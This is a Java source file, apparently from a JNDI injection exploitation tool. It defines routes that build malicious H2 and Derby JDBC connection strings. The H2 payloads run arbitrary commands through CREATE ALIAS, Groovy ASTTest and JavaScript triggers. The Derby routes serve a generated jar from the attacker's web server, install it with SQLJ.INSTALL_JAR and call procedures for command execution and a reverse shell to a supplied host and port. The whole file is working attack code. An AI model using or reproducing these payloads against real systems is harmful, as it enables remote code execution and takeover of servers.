package map.jndi.controller;

import javassist.ClassPool;
import javassist.CtClass;
import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.bean.DatabaseBean;
import map.jndi.server.WebServer;
import map.jndi.template.DerbyJarTemplate;
import map.jndi.util.JarUtil;
import map.jndi.util.MiscUtil;

import java.util.ArrayList;
import java.util.List;

@JNDIController
public class DatabaseController implements Controller {
    @JNDIMapping("/H2/Alias/{cmd}")
    public DatabaseBean h2Alias(String cmd) {
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
                "CALL EXEC ('" + cmd + "')\\;";

        System.out.println("H2 CREATE ALIAS Cmd: " + cmd);
        return new DatabaseBean("org.h2.Driver", url);
    }

    @JNDIMapping("/H2/Groovy/{cmd}")
    public DatabaseBean h2Groovy(String cmd) {
        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";

        System.out.println("H2 Groovy Cmd: " + cmd);
        return new DatabaseBean("org.h2.Driver", url);
    }

    @JNDIMapping("/H2/JavaScript/{cmd}")
    public DatabaseBean h2JavaScript(String cmd) {
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ javascript +"'";

        System.out.println("H2 JavaScript Cmd: " + cmd);
        return new DatabaseBean("org.h2.Driver", url);
    }

    @JNDIMapping("/Derby/Create/{database}")
    public DatabaseBean derbyCreate(String database) {
        String url = "jdbc:derby:memory:" + database + ";create=true";

        System.out.println("Derby Create Database: " + database);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url);
    }

    @JNDIMapping("/Derby/Drop/{database}")
    public DatabaseBean derbyDrop(String database) {
        String url = "jdbc:derby:memory:" + database + ";drop=true";

        System.out.println("Derby Drop Database: " + database);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url);
    }

    @JNDIMapping("/Derby/Slave/{database}/{host}/{port}")
    public DatabaseBean derbySlave(String host, String port, String database) {
        String url = "jdbc:derby:memory" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;

        System.out.println("Derby Slave Replication Mode Host: " + host + " Port: " + port + " Database: " + database);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url);
    }

    @JNDIMapping("/Derby/InstallJar/{database}")
    public DatabaseBean derbyInstallJar(String database) throws Exception {
        String url = "jdbc:derby:memory:" + database + ";create=true";
        String className = MiscUtil.getRandStr(12);

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        String jarName = className;
        byte[] jarBytes = JarUtil.create(jarName, clazz.toBytecode());
        WebServer.serveFile("/" + jarName + ".jar", jarBytes);

        List<String> list = new ArrayList<>();
        list.add("CALL SQLJ.INSTALL_JAR('" + Main.codebase + jarName + ".jar', 'APP." + className + "', 0)");
        list.add("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')");
        list.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
        list.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");

        System.out.println("Derby Install Jar Database: " + database);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url, String.join(";", list));
    }

    @JNDIMapping("/Derby/Command/{database}/{cmd}")
    public DatabaseBean derbyCommand(String database, String cmd) {
        String url = "jdbc:derby:memory:" + database + ";create=true";

        List<String> list = new ArrayList<>();
        list.add("CALL cmd('" + cmd  + "')");

        System.out.println("Derby Cmd: " + cmd);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url, String.join(";", list));
    }

    @JNDIMapping("/Derby/ReverseShell/{database}/{host}/{port}")
    public DatabaseBean derbyReverseShell(String database, String host, String port) {
        String url = "jdbc:derby:" + database + ";create=true";

        List<String> list = new ArrayList<>();
        list.add("CALL rev('" + host + "', '" + port + "')");

        System.out.println("Derby ReverShell Host: " + host + " Port: " + port);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url, String.join(";", list));
    }
}
